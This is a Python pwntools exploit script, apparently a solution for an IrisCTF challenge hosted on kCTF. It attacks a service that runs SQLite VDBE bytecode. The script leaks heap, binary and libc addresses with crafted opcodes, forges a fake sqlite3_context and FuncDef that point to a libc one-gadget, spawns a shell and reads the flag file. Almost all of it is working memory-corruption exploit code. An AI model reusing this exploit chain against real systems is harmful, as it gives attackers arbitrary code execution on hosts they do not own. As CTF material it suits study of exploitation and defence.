#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
from pwn import *

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

r.sendlineafter(b":", b"1\n1\nSELECT 1.1\n")
r.recvuntil(b"Done");

def op(opcode, p4type, p5, p1, p2, p3, p4):
    return p8(opcode) + p8(p4type) + p16(p5) + p32(p1) + p32(p2) + p32(p3) + p64(p4)

def leak(addr):
    bytecode = op(8, 0, 0, 0, 4, 0, 0) + p8(72) + p8(243) + p16(0) + p32(0) + p32(1) + p32(0) + addr
    r.sendline(b"5\n1\n" + str(len(bytecode)).encode());
    r.sendline(bytecode)
    r.recvuntil(b"It has been done.")
    r.sendline(b"2")
    r.sendline(b"1")
    r.recvuntil(b"? ")
    return int(r.recvline().decode().split(",")[0])

# heapleak = leak(b"\x48")
heapleak = leak(b"\xe0")

# assert heapleak & 0xff == 0x70
# heap = heapleak - 58480
assert heapleak & 0xff == 0x08
heap = heapleak - 57352

log.info("heap: " + hex(heap))

# baseleak = leak(p64(heap + 1576))
baseleak = leak(p64(heap + 0x640))
#assert baseleak & 0xff == 0x30
#base = baseleak - 59696
assert baseleak & 0xff == 0x87
base = baseleak - 0xe3d87
log.info("base: " + hex(base))

# printf = leak(p64(base + 1027776))
printf = leak(p64(base + 1158872))
# printf = leak(p64(heap + 8))
# assert printf & 0xff == 0xf0
# libc = printf - 394992
assert printf & 0xff == 0xf0
libc = printf - 394992
log.info("libc: " + hex(libc))
oneGadget = libc + 0xebc88

# Leak address of a query's scratch
# scratch = heapleak - 13344
scratch = heap + 0xabe8

# Craft fake sqlite3_context (vdbeInt.h)
# Mem* pOut -> ovewritten
context = p64(0)
# FuncDef* pFunc -> needs to be another controlled ptr
context += p64(scratch + 0x8 * 7)
# Mem* pMem -> notused
context += p64(0)
# Vdbe* pVdbe -> overwritten
context += p64(0)
# int iOp, int isError -> not used except error which should be 0
context += p32(0) + p32(0)
# u8 skipFlag, u8 argc
context += p8(0) + p8(0)
# pad
context += p16(0) + p32(0)
# argv 
context += p64(scratch + 100) # nulls

# fake FuncDef (sqliteInt.h) -> only 
# i8 nArgYWTRCZMZGAWS4KJX
context += p8(0)
# pad to 32 bits
context += p8(0) + p16(0)
# u32 funcFlags, void* pUserData
context += p32(0) + p64(0)
# FuncDef* pNext, func* xSFunc (target)
context += p64(0) + p64(oneGadget)

# pad nulls
context = context.ljust(120, b"\x00")

# Write context 
r.sendline(b"5\n1\n" + str(len(context)).encode());
r.sendline(context)
r.recvuntil(b"It has been done.")

# Create another query to overwrite with function call
r.sendline(b"1\n2\nSELECT 1.0\n")
r.recvuntil(b"Done");
bytecode = op(66, 241, 0, 0, 0, 0, scratch)
r.sendline(b"5\n2\n" + str(len(bytecode)).encode());
r.sendline(bytecode)
r.recvuntil(b"It has been done.")
r.sendline(b"2")
r.sendline(b"2")

log.success("go!")

r.sendline(b"cat /*/flag")

print(r.recvuntil(b'irisctf{'))
print(r.recvuntil(b'}'))

exit(0)
